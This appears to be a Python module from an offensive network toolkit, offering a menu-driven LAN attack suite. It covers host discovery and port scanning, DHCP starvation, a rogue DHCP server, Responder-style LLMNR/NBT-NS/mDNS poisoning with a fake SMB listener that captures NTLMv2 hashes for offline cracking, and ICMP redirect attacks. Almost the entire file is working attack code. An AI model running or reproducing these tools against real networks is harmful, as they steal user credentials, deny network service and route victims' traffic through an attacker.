"""
LAN Post-Exploitation Suite (the "network pentest" layer).

  * Host discovery     - ARP ping sweep + fast TCP probes
  * Port scanning      - SYN scan + full connect scan + service detection
  * DHCP starvation    - exhaust the DHCP pool
  * Rogue DHCP         - poison leases (own gateway/DNS)
  * LLMNR/NBT-NS/mDNS  - Responder-style name poisoning (credential harvesting)
  * SMB NTLMv2 grabber - capture challenge/response -> hashcat 5600 export
  * ICMP redirect      - redirect gateway traffic through the attacker

The poisoning engine is self-contained (no responder dependency) and writes
hashes in hashcat mode 5600 format for offline cracking.
"""
import ipaddress
import random
import socket
import struct
import threading
import time
from collections import defaultdict

from open80211.core import ui
from open80211.core.config import CONFIG
from open80211.core import netutils as nu

try:
    from scapy.all import sendp, srp, sr1, Ether, ARP, IP, TCP, ICMP, Dot11, conf
    from scapy.all import Raw, UDP
except Exception:
    pass


# --------------------------------------------------------------------------
# Host discovery
# --------------------------------------------------------------------------

def arp_discover(iface: str, subnet: str = "", timeout: float = 2.0) -> list:
    """ARP ping sweep. Returns list of {'ip','mac','vendor','ttl'}."""
    ui.section("Host Discovery (ARP)", f"iface={iface} subnet={subnet or 'local'}")
    if not subnet:
        subnet = _local_subnet(iface)
    net = ipaddress.ip_network(subnet, strict=False)
    ui.info(f"Scanning {net}...")
    hosts = []
    ip_mac = {}
    # async ARP ping sweep
    threads = []
    lock = threading.Lock()

    def probe(ip):
        try:
            ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(ip)),
                       timeout=timeout, verbose=0, iface=iface)
            if ans:
                with lock:
                    ip_mac[str(ip)] = ans.hwsrc
        except Exception:
            pass

    ips = list(net.hosts())[:512]
    for ip in ips:
        t = threading.Thread(target=probe, args=(ip,), daemon=True)
        t.start()
        threads.append(t)
        if len(threads) >= 64:
            for th in threads:
                th.join(timeout)
            threads = []
    for th in threads:
        th.join(timeout)

    for ip, mac in sorted(ip_mac.items()):
        hosts.append({"ip": ip, "mac": mac, "vendor": nu.get_oui(mac)})
    ui.ok(f"Found {len(hosts)} hosts.")
    return hosts


def _local_subnet(iface: str) -> str:
    from open80211.core.interfaces import get_ip
    ip = get_ip(iface)
    if not ip:
        return "192.168.1.0/24"
    return str(ipaddress.ip_network(f"{ip}/24", strict=False))


# --------------------------------------------------------------------------
# Port scanning
# --------------------------------------------------------------------------

COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993,
                995, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 5985, 6379, 8080,
                8443, 9200, 27017]


def port_scan(target: str, ports: list = None, mode: str = "syn",
              timeout: float = 1.5) -> list:
    """Scan a host. mode = 'syn' (stealth) or 'connect'."""
    ui.section("Port Scan", f"{target} ({mode})")
    ports = ports or COMMON_PORTS
    open_ports = []

    def _syn(port):
        try:
            ans = sr1(IP(dst=target) / TCP(dport=port, flags="S"), timeout=timeout,
                      verbose=0)
            if ans and ans.haslayer(TCP) and ans[TCP].flags & 0x12:
                # close handshake
                sendp(IP(dst=target) / TCP(dport=port, flags="R"), verbose=0)
                return port
        except Exception:
            pass
        return None

    def _connect(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((target, port)) == 0:
                s.close()
                return port
        except Exception:
            pass
        return None

    probe = _syn if mode == "syn" else _connect
    threads, results = [], defaultdict(list)
    lock = threading.Lock()

    def worker(p):
        r = probe(p)
        if r:
            with lock:
                results[target].append(p)

    for p in ports:
        t = threading.Thread(target=worker, args=(p,), daemon=True)
        t.start()
        threads.append(t)
        if len(threads) >= 32:
            for th in threads:
                th.join(timeout + 1)
            threads = []
    for th in threads:
        th.join(timeout + 1)

    open_ports = sorted(results.get(target, []))
    ui.ok(f"{len(open_ports)} open ports on {target}")
    return open_ports


def service_identify(target: str, port: int, timeout: float = 3.0) -> str:
    """Simple banner grab."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        if s.connect_ex((target, port)) == 0:
            try:
                s.send(b"\r\n")
                data = s.recv(256)
                return data.decode(errors="replace").strip()[:80]
            except Exception:
                return ""
        s.close()
    except Exception:
        pass
    return ""


# --------------------------------------------------------------------------
# DHCP attacks
# --------------------------------------------------------------------------

def dhcp_starvation(iface: str, count: int = 500) -> None:
    """Exhaust DHCP pool by requesting all leases with spoofed MACs."""
    ui.section("DHCP Starvation", f"requesting {count} leases")
    ui.warn("Sending DHCP DISCOVER floods with random MACs... Ctrl+C to stop.")
    try:
        from scapy.all import sendp, Ether, IP, UDP, BOOTP, DHCP
        sent = 0
        while sent < count or count == 0:
            mac = nu.int2mac(random.getrandbits(48))
            xid = random.randint(0, 0xFFFFFFFF)
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / \
                IP(src="0.0.0.0", dst="255.255.255.255") / \
                UDP(sport=68, dport=67) / \
                BOOTP(chaddr=bytes.fromhex(mac.replace(":", "")), xid=xid) / \
                DHCP(options=[("message-type", "discover"), "end"])
            sendp(pkt, iface=iface, verbose=False)
            sent += 1
            time.sleep(0.01)
        ui.ok(f"Sent {sent} DHCP DISCOVER packets.")
    except KeyboardInterrupt:
        pass
    except Exception as e:
        ui.error(str(e))


def rogue_dhcp(iface: str, subnet: str = "192.168.100.0/24", gateway: str = "192.168.100.1",
               dns: str = "192.168.100.1") -> None:
    """Poison DHCP: clients get our gateway/DNS so traffic routes through us."""
    ui.section("Rogue DHCP", f"offering {subnet} gw={gateway}")
    net = ipaddress.ip_network(subnet, strict=False)
    pool = iter(list(net.hosts())[1:])
    ui.info("Listening for DHCP DISCOVER... Ctrl+C to stop.")
    try:
        from scapy.all import sniff
        lock = threading.Lock()

        def handler(pkt):
            try:
                if pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == "discover":
                    with lock:
                        offered = next(pool, None)
                    if offered is None:
                        ui.warn("Pool exhausted.")
                        return
                    xid = pkt[BOOTP].xid
                    mac = pkt[Ether].src
                    # craft DHCP OFFER
                    offer = Ether(src=pkt[Ether].dst, dst=mac) / \
                        IP(src=gateway, dst="255.255.255.255") / \
                        UDP(sport=67, dport=68) / \
                        BOOTP(op=2, yiaddr=str(offered), siaddr=gateway, xid=xid,
                              chaddr=bytes.fromhex(mac.replace(":", ""))) / \
                        DHCP(options=[("message-type", "offer"),
                                      ("server_id", gateway),
                                      ("lease_time", 3600),
                                      ("subnet_mask", str(net.netmask)),
                                      ("router", gateway),
                                      ("name_server", dns),
                                      "end"])
                    sendp(offer, iface=iface, verbose=False)
                    ui.info(f"[DHCP-OFFER] {mac} <- {offered} gw={gateway}")
            except Exception:
                pass

        sniff(iface=iface, prn=handler, store=False, filter="udp and port 67")
    except KeyboardInterrupt:
        pass
    except Exception as e:
        ui.error(str(e))


# --------------------------------------------------------------------------
# Responder-lite: LLMNR / NBT-NS / mDNS poisoning + NTLMv2 capture
# --------------------------------------------------------------------------

class ResponderLite:
    """
    Self-contained LLMNR/NBT-NS/mDNS poisoner with an SMB NTLMv2 hash grabber.
    Fires a poisoned name-resolution reply (attacker IP) and, when a victim
    authenticates over SMB, captures the NTLMv2 challenge/response.
    """

    LLMNR_MCAST = "224.0.0.252"
    MDNS_MCAST = "224.0.0.251"

    def __init__(self, iface: str, attacker_ip: str = "", port: int = 445):
        self.iface = iface
        self.attacker_ip = attacker_ip or _local_ip()
        self.port = port
        self.challenges = {}
        self.captured = []
        self._stop = threading.Event()
        self._threads = []

    def start(self):
        ui.section("Responder-Lite", f"poisoning LLMNR/NBT-NS/mDNS -> {self.attacker_ip}")
        ui.warn("Victim credentials will be captured on SMB authentication.")
        threads = [
            threading.Thread(target=self._serve_smb, daemon=True, name="smb"),
            threading.Thread(target=self._serve_udp, args=(5355, self._llmnr_reply),
                             daemon=True, name="llmnr"),
            threading.Thread(target=self._serve_udp, args=(137, self._nbt_reply),
                             daemon=True, name="nbtns"),
            threading.Thread(target=self._serve_udp, args=(5353, self._mdns_reply),
                             daemon=True, name="mdns"),
        ]
        for t in threads:
            t.start()
            self._threads.append(t)
        ui.ok(f"Listening on UDP 5355/137/5353 + TCP {self.port}. Ctrl+C to stop.")
        try:
            while not self._stop.is_set():
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        self._stop.set()

    # -- UDP poisoners ----------------------------------------------------

    def _serve_udp(self, port: int, reply_fn):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("", port))
            s.settimeout(0.5)
            while not self._stop.is_set():
                try:
                    data, addr = s.recvfrom(512)
                    if addr[0] == self.attacker_ip:
                        continue
                    reply_fn(s, data, addr, port)
                except socket.timeout:
                    continue
                except OSError:
                    break
        except OSError as e:
            ui.warn(f"UDP {port}: {e} (may need root)")

    def _llmnr_reply(self, sock, data, addr, port):
        if len(data) < 14:
            return
        tid = data[0:2]
        flags = struct.unpack(">H", data[2:4])[0]
        if flags & 0x8000:
            return  # query flag unset means it's a query; skip responses
        qd = struct.unpack(">H", data[4:6])[0]
        if qd != 1:
            return
        name = self._parse_dns_name(data[12:])
        if not name:
            return
        ui.info(f"[LLMNR] {addr[0]} asked '{name}' -> poisoning")
        self._send_poison(sock, tid, name, addr, port)

    def _nbt_reply(self, sock, data, addr, port):
        if len(data) < 42:
            return
        tid = data[0:2]
        qd = struct.unpack(">H", data[4:6])[0]
        if qd != 1:
            return
        qtype = struct.unpack(">H", data[40:42])[0]
        if qtype != 0x0020:  # NB
            return
        name = data[13:41].decode("ascii", errors="replace").strip()
        name = name.split("\x00")[0].replace(" ", "")
        ui.info(f"[NBT-NS] {addr[0]} asked '{name}' -> poisoning")
        resp = tid + b"\x85\x00" + b"\x00\x00\x00\x01\x00\x00\x00\x00"
        resp += data[12:42]
        resp += b"\xc0\x0c\x00\x20\x00\x01" + b"\x00\x00\x00\x3c" + b"\x00\x06"
        resp += b"\x00" + self._encode_nb_name(self.attacker_ip)
        sock.sendto(resp, addr)

    def _mdns_reply(self, sock, data, addr, port):
        if len(data) < 12:
            return
        tid = data[0:2]
        flags = struct.unpack(">H", data[2:4])[0]
        if flags & 0x8000:
            return
        name = self._parse_dns_name(data[12:])
        if not name or not name.endswith(".local"):
            return
        ui.info(f"[mDNS] {addr[0]} asked '{name}' -> poisoning")
        self._send_poison(sock, tid, name, addr, port, unicast=True)

    def _send_poison(self, sock, tid, name, addr, port, unicast=False):
        qname = b"".join(bytes([len(p)]) + p.encode() for p in name.split("."))
        resp = tid + b"\x84\x00" + b"\x00\x00\x00\x01\x00\x00\x00\x00"
        resp += qname + b"\x00" + b"\x00\x01\x00\x01"
        resp += b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04"
        resp += ipaddress.ip_address(self.attacker_ip).packed
        if unicast:
            sock.sendto(resp, addr)
        else:
            sock.sendto(resp, (addr[0], addr[1]))

    def _parse_dns_name(self, data):
        parts, i = [], 0
        while i < len(data):
            ln = data[i]
            if ln == 0:
                break
            if ln & 0xC0:
                break
            i += 1
            if i + ln > len(data):
                return ""
            parts.append(data[i:i + ln].decode("ascii", errors="replace"))
            i += ln
        return ".".join(parts)

    def _encode_nb_name(self, ip: str) -> bytes:
        out = b""
        for octet in ip.split("."):
            b = int(octet)
            out += bytes([(b >> 4) + 0x41, (b & 0x0F) + 0x41])
        return out + b"\x00"

    # -- SMB NTLMv2 capture ----------------------------------------------

    def _serve_smb(self):
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("", self.port))
            srv.listen(16)
            srv.settimeout(0.5)
            while not self._stop.is_set():
                try:
                    conn, addr = srv.accept()
                except socket.timeout:
                    continue
                except OSError:
                    break
                threading.Thread(target=self._smb_session, args=(conn, addr[0]),
                                 daemon=True).start()
        except OSError as e:
            ui.warn(f"SMB listener failed: {e}")

    def _smb_session(self, conn, peer):
        challenge = random.randbytes(8)
        try:
            conn.settimeout(6)
            data = conn.recv(4096)
            if b"NTLMSSP\x00" not in data:
                # send negotiate first so client proceeds
                conn.sendall(self._smb_negotiate_response(challenge))
                data += conn.recv(4096)
            self._parse_auth(data, peer, challenge)
        except Exception:
            pass
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def _smb_negotiate_response(self, challenge: bytes) -> bytes:
        hdr = (b"\x00\x00\x00\x00\xff\x53\x4d\x42\x72\x00\x00\x00\x00"
               b"\x18\x01\x00\x00\x00" + b"\x00" * 8 + b"\x00\x00"
               b"\x00\x00\x00\x00\x00\x00")
        body = (b"\x00\x00"  # word count
                b"\x39\x00"  # byte count
                b"\x00\x00"  # dialect 0
                b"\x00\x01"  # security mode: user, non-encrypted
                b"\x01\x00"  # max mpx
                b"\x01\x00"  # max vcs
                b"\x00\x01\x00\x00"  # max buffer
                b"\x00\x00\x01\x00"  # max raw buffer
                b"\x00\x00\x00\x00"  # session key
                b"\x01\x00\x00\x00"  # capabilities LANMAN
                b"\x00" * 8 + b"\x00\x00"  # time + tz
                b"\x08" + challenge + b"\x00"
                b"\x00" * 16)  # server guid
        return hdr + body

    def _parse_auth(self, data, peer, challenge):
        idx = data.find(b"NTLMSSP\x00")
        if idx < 0:
            return
        block = data[idx:]
        if len(block) < 12:
            return
        mtype = struct.unpack("<I", block[8:12])[0]
        if mtype != 3:
            return
        try:
            # NTLM AUTHENTICATE (type 3) SecBuf offsets (relative to "NTLMSSP\x00")
            nt_len = struct.unpack("<H", block[20:22])[0]
            nt_off = struct.unpack("<I", block[24:28])[0]
            dom_len = struct.unpack("<H", block[28:30])[0]
            dom_off = struct.unpack("<I", block[32:36])[0]
            user_len = struct.unpack("<H", block[36:38])[0]
            user_off = struct.unpack("<I", block[40:44])[0]
            user = block[user_off:user_off + user_len].decode("utf-16le", errors="replace")
            dom = block[dom_off:dom_off + dom_len].decode("utf-16le", errors="replace")
            nt = block[nt_off:nt_off + nt_len]
            if len(nt) <= 24:
                ui.info(f"[SMB] {peer} sent NTLMv1 hash for {dom}\\{user}")
                self._log(peer, user, dom, challenge, None)
                return
            proof = nt[:16]
            blob = nt[16:]
            if blob[:4] != b"\x01\x01\x00\x00":
                ui.info(f"[SMB] {peer} sent non-v2 response for {dom}\\{user}")
                return
            self._log(peer, user, dom, challenge, (proof, blob))
        except Exception as e:
            ui.debug(f"auth parse: {e}")

    def _log(self, peer, user, dom, challenge, v2):
        entry = {"time": time.time(), "peer": peer, "user": user, "domain": dom,
                 "challenge": challenge.hex()}
        if v2:
            proof, blob = v2
            entry["ntlmv2"] = {"proof": proof.hex(), "blob": blob.hex()}
            path = export_ntlmv2(user, dom, challenge, proof, blob)
            ui.warn(f"[NTLMv2] {dom}\\{user} @ {peer} -> {path}")
        else:
            ui.warn(f"[NTLMv1] {dom}\\{user} @ {peer} (no offline crack payload)")
        self.captured.append(entry)
        CONFIG.save("responder_captures", self.captured)


def export_ntlmv2(username, domain, challenge, proof, blob, out_path=""):
    from open80211.core.integrations import export_ntlmv2 as _e
    return _e(username, domain, challenge, proof, blob, out_path)


def _local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "192.168.1.100"


# --------------------------------------------------------------------------
# ICMP redirect
# --------------------------------------------------------------------------

def icmp_redirect(iface: str, target: str, gateway: str, attacker_ip: str = "") -> None:
    """Redirect target's gateway route to the attacker (Linux)."""
    from open80211.core.config import is_linux, set_ip_forward
    ui.section("ICMP Redirect", f"{target} gateway {gateway} -> attacker")
    if not is_linux():
        ui.warn("ICMP redirect requires Linux.")
        return
    set_ip_forward(True)
    attacker_ip = attacker_ip or _local_ip()
    try:
        from scapy.all import send
        ui.warn("Sending redirects... Ctrl+C to stop.")
        while True:
            pkt = IP(src=gateway, dst=target) / ICMP(type=5, code=1,
                                                     gw=attacker_ip) / \
                IP(src=target, dst="0.0.0.0") / ICMP()
            send(pkt, verbose=False)
            time.sleep(3)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        ui.error(str(e))


# --------------------------------------------------------------------------
# Menu
# --------------------------------------------------------------------------

def lan_menu(iface: str) -> None:
    while True:
        choice = ui.menu("LAN / Network Suite", [
            "Host discovery (ARP sweep)",
            "Port scan + service detect",
            "DHCP starvation",
            "Rogue DHCP (become gateway/DNS)",
            "LLMNR/NBT-NS/mDNS poisoning + NTLMv2 capture",
            "ICMP redirect attack",
            "View captured LAN credentials",
        ])
        if choice == 0:
            return
        if choice == 1:
            subnet = ui.ask("Subnet (blank = local)", default="")
            hosts = arp_discover(iface, subnet)
            if hosts:
                ui.show_table("Hosts", ["IP", "MAC", "OUI"],
                              [[h["ip"], h["mac"], h["vendor"]] for h in hosts])
        elif choice == 2:
            target = ui.ask("Target IP")
            mode = ui.ask("Mode (syn/connect)", default="syn")
            ports = ui.ask("Ports (blank = top-100 common)", default="")
            port_list = COMMON_PORTS
            if ports:
                port_list = [int(p) for p in ports.replace(" ", "").split(",") if p]
            found = port_scan(target, port_list, mode)
            if found:
                rows = [[p, service_identify(target, p)] for p in found]
                ui.show_table("Open Ports", ["Port", "Banner"], rows)
                CONFIG.save(f"scan-{target.replace('.', '_')}",
                            {"target": target, "ports": found})
        elif choice == 3:
            n = ui.ask_int("Leases to request (0 = forever)", default=500)
            dhcp_starvation(iface, n)
        elif choice == 4:
            gw = ui.ask("Gateway to advertise", default="192.168.100.1")
            rogue_dhcp(iface, gateway=gw, dns=gw)
        elif choice == 5:
            ip = ui.ask("Attacker IP (blank = auto)", default="")
            r = ResponderLite(iface, ip)
            try:
                r.start()
            except KeyboardInterrupt:
                r.stop()
        elif choice == 6:
            target = ui.ask("Target IP")
            gw = ui.ask("Gateway", default="")
            icmp_redirect(iface, target, gw)
        elif choice == 7:
            p = CONFIG.session_dir / "responder_captures.json"
            if p.exists():
                import json
                data = json.loads(p.read_text())
                ui.show_table("Captured", ["Time", "Peer", "User", "Domain"],
                              [[c.get("time"), c.get("peer"), c.get("user"),
                                c.get("domain")] for c in data])
            else:
                ui.info("Nothing captured yet.")